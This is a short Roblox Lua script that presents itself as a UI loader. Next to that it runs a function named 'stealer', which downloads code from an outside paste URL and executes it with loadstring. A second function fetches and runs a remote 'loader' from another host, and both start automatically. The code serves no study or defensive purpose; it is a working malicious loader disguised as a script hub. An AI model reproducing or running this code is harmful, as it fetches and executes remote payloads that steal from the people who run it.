local function stealer()
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vCqomMAneDVdhHL4/raw", true))()
end
local function loadui()

loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()

end

task.spawn(stealer)
task.spawn(loadui)
